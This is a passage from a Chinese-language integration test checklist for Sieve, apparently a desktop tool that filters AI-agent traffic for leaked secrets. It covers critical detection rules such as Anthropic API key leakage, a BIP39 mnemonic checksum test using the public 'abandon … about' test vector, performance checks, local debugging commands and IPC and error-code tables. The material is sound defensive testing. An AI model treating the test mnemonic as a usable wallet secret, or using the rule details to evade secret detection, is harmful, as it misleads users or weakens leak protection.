- 弹窗关闭时清空 rawJSON：[`Sources/Features/HIPS/HipsPanelManager.swift:235`](../../Sources/Features/HIPS/HipsPanelManager.swift)（`activeRequest?.clearRawJSON()`）

- [ ] 弹窗关闭后 log 无原始 prompt 内容

### 14.3 sensitive 字段必须 MaskedField

**操作步骤：**
1. 触发一次 HIPS 决策（Allow 并 remember）
2. 打开 History Inspector，查看 fingerprint、session_id、caller_pid 等字段

**预期效果：**
- 未解锁状态：敏感字段显示为掩码（`****` 或 `ab...cd`）
- Touch ID 解锁后：显示真实值

**代码位置：**
- MaskedField 组件：[`Sources/UI/Components/MaskedField.swift`](../../Sources/UI/Components/MaskedField.swift)
- Inspector 中使用：[`Sources/Features/History/InspectorPanelView.swift:26`](../../Sources/Features/History/InspectorPanelView.swift)

- [ ] 敏感字段 MaskedField 正确

### 14.4 fail-closed Critical 不可关

**操作步骤：**
1. Settings → Detection Preset → Custom 模式
2. 找到 `critical_lock` 类规则（如 OUT-01 Anthropic API Key）
3. 尝试修改 action 为 allow

**预期效果：**
- `critical_lock` 行的控件 disabled，有 tooltip 说明原因
- 不允许用户通过 UI 关闭 Critical 规则

**代码位置：**[`Sources/Features/Settings/DetectionPresetView.swift`](../../Sources/Features/Settings/DetectionPresetView.swift)（custom rule table 中 critical_lock 处理逻辑）

- [ ] Critical 规则不可关闭

### 14.5 BIP39 SHA-256 checksum 验证（仅词表匹配应不触发 Critical）

**操作步骤：**
1. 发送 BIP39 词表中的词但 checksum 无效的序列：
   ```
   abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon
   ```
   （12 个 "abandon"，最后一词 checksum 不通过）
2. 发送有效 BIP39 助记词：
   ```
   abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about
   ```

**代码位置：**
- second-pass 逻辑：[`crates/sieve-cli/src/engine_adapter.rs:293`](../../../sieve/crates/sieve-cli/src/engine_adapter.rs)
- checksum 验证：[`crates/sieve-cli/src/engine_adapter.rs:318`](../../../sieve/crates/sieve-cli/src/engine_adapter.rs)（`if bip39::verify_checksum(&window, wl) { ... 定级 Critical ... }`）

**预期效果：**
- 12 个 "abandon"（checksum 无效）：不触发 Critical，最多触发词表命中的低级 warn
- `abandon × 11 + about`（checksum 有效）：触发 Critical HIPS 弹窗

- [ ] BIP39 checksum 验证正确（仅词表匹配不触发 Critical）

---

## 15. 性能预算（dogfood 阶段验证，非红线）

### 15.1 P99 规则扫描 < 20ms

**操作步骤：**
```bash
cd /Users/doskey/src/sieve-suite/sieve
cargo bench -p sieve-rules
```

或通过 Debug → 规则评估 Tab 多次评估，观察响应时间。

- [ ] P99 < 20ms（benchmark 通过）

### 15.2 daemon 内存 < 合理阈值

**操作步骤：**
```bash
# 启动后空闲观察
ps aux | grep sieve-cli | awk '{print $6}'  # RSS in KB
```

- [ ] daemon 内存在合理范围（建议 < 100MB）

### 15.3 hook 启动时延 < 50ms

**操作步骤：**
```bash
cd /Users/doskey/src/sieve-suite/sieve
cargo bench -p sieve-hook
# 或手动计时
time cargo run -p sieve-hook -- check --request-id $(uuid) --sieve-home /tmp/sieve-test
```

- [ ] hook 启动时延 < 50ms

### 15.4 GUI 启动到菜单栏出现 < 1s

**操作步骤：**
1. daemon 已启动（ipc.sock 存在）
2. `time open /path/to/Sieve\ GUI.app`，观察菜单栏图标出现时间

- [ ] GUI 启动 < 1s 菜单栏图标出现

---

## 16. 联调发现的问题（用户填）

| # | 现象 | 触发场景 | 复现概率 | 期望行为 | 实际行为 | 优先级 | 状态 |
|---|------|---------|----------|---------|---------|--------|------|
| 1 | | | | | | | 待修 |
| 2 | | | | | | | 待修 |
| 3 | | | | | | | 待修 |

---

## 附录 A：常用调试命令

```bash
# daemon 日志（开发模式）
SIEVE_LOG=sieve_cli=debug,info cargo run -p sieve-cli -- start --config /tmp/sieve-test.toml

# GUI 日志
tail -f ~/.sieve/gui.log

# GUI 日志 + grep
grep -i "handshake\|hello\|error\|fail\|hips\|decision" ~/.sieve/gui.log | tail -50

# audit.db 最近 20 条事件
sqlite3 ~/.sieve/audit.db "SELECT id, rule_id, disposition, user_choice, created_at FROM events ORDER BY id DESC LIMIT 20;"

# audit.db 灰名单
sqlite3 ~/.sieve/audit.db "SELECT * FROM graylist ORDER BY added_at DESC;"

# IPC socket 状态（应是 socket 文件，权限 0600）
ls -la ~/.sieve/ipc.sock

# sieve_home 目录权限（应是 0700）
ls -la ~/.sieve/

# 杀残留进程
pkill -9 sieve-cli

# 检查 socket 是否有监听进程
lsof -U ~/.sieve/ipc.sock

# 用 ncat 模拟 GUI（调试 daemon 侧 IPC）
brew install nmap  # 包含 ncat
ncat -U ~/.sieve/ipc.sock

# 触发真实流量（Claude Code 通过代理）
ANTHROPIC_BASE_URL=http://127.0.0.1:11453 claude --bare -p "hello"

# 手动发送 sieve.hello（测试版本不匹配）
echo '{"jsonrpc":"2.0","method":"sieve.hello","params":{"protocol_version":"v99","daemon_version":"9.9.9","daemon_boot_id":"00000000-0000-0000-0000-000000000000","paused":false,"preset":"standard","uptime_seconds":0,"audit_db_user_version":2}}' | ncat -U ~/.sieve/ipc.sock
```

---

## 附录 B：IPC method 速查

参考上游 [`crates/sieve-ipc/src/socket_server.rs`](../../../sieve/crates/sieve-ipc/src/socket_server.rs)

| Method | 方向 | 描述 |
|--------|------|------|
| `sieve.hello` | daemon → GUI（notification） | 握手，7 字段，连接建立后第一条消息 |
| `sieve.heartbeat` | daemon → GUI（notification） | 心跳，25s 间隔，无 params |
| `sieve.request_decision` | daemon → GUI（request） | HIPS 弹窗请求，GUI 需回复 |
| `sieve.request_decision_canceled` | daemon → GUI（notification） | 取消弹窗请求 |
| `sieve.notify_status_bar` | daemon → GUI（notification） | 出站脱敏 / 入站 hook 拦截通知 |
| `sieve.preset_changed` | daemon → GUI（notification） | preset 被（其他 GUI 或 CLI）修改 |
| `sieve.paused_changed` | daemon → GUI（notification） | paused 状态变化 |
| `sieve.set_preset` | GUI → daemon（request） | 切换 preset |
| `sieve.set_paused` | GUI → daemon（request） | 设置暂停状态（`minutes=0` 恢复） |
| `sieve.set_preset_overrides` | GUI → daemon（request） | Custom 模式规则覆盖（v2.0+） |
| `sieve.reload_config` | GUI → daemon（request） | 重新加载配置文件 |
| `sieve.health` | GUI → daemon（request） | 健康检查 |
| `sieve.evaluate` | GUI → daemon（request） | 规则评估（Debug Tab，≤64KB） |
| `sieve.list_graylist` | GUI → daemon（request） | 获取灰名单列表 |
| `sieve.remove_graylist` | GUI → daemon（request） | 删除灰名单条目 |
| `sieve.list_rules` | GUI → daemon（request） | 获取规则总览（v2.0+） |
| `sieve.purge_history` | GUI → daemon（request） | 清空历史记录（v2.0+，需 Touch ID） |
| `decision_response` | GUI → daemon（response） | 用户决策回复（HIPS 弹窗结果） |
| `decision_error` | GUI → daemon（error response） | 决策失败通知（-32100~-32102） |

---

## 附录 C：错误码速查

| code | 段位 | 名称 | 触发条件 |
|------|------|------|---------|
| -32700 | JSON-RPC 标准 | `parse_error` | JSON 解析失败（不关闭连接） |
| -32600 | JSON-RPC 标准 | `invalid_request` | 请求缺字段或类型错 |
| -32601 | JSON-RPC 标准 | `method_not_found` | 方法名不存在（daemon 版本过旧） |
| -32602 | JSON-RPC 标准 | `invalid_params` | 参数无效 |
| -32603 | JSON-RPC 标准 | `internal_error` | daemon 内部错误 |
| -32000 | Sieve 自定义 | `protocol_version_mismatch` | GUI 协议版本不被 daemon 接受 |
| -32001 | Sieve 自定义 | `critical_lock_violated` | 操作触碰 critical_lock 规则 |
| -32002 | Sieve 自定义 | `daemon_busy` | daemon reload/restart 进行中 |
| -32003 | Sieve 自定义 | `payload_too_large` | evaluate payload > 64KB |
| -32004 | Sieve 自定义 | `unknown_fingerprint` | list/remove graylist 找不到 fingerprint |
| -32005 | Sieve 自定义 | `unsupported_in_paused` | 暂停状态下不支持此操作（保留） |
| -32006 | Sieve v2.0+ | `rules_loading` | list_rules 时规则引擎未初始化完成，5s 后重试 |
| -32007 | Sieve v2.0+ | `purge_in_progress` | purge_history 并发防护（另一个 purge 进行中） |
| -32100 | GUI → daemon | `user_canceled_via_window_close` | 用户关闭弹窗（无决策） |
| -32101 | GUI → daemon | `gui_render_failed` | HIPS 弹窗渲染失败（context 缺失等） |
| -32102 | GUI → daemon | `gui_shutdown_during_decision` | GUI 进程在决策期间退出 |

**错误码源码位置：**
- daemon 侧：[`crates/sieve-ipc/src/error.rs:73`](../../../sieve/crates/sieve-ipc/src/error.rs)（`pub mod rpc_codes`）
- GUI 侧：[`Sources/Models/DecisionResponse.swift:132`](../../Sources/Models/DecisionResponse.swift)（`DecisionError` enum，-32100~-32102）
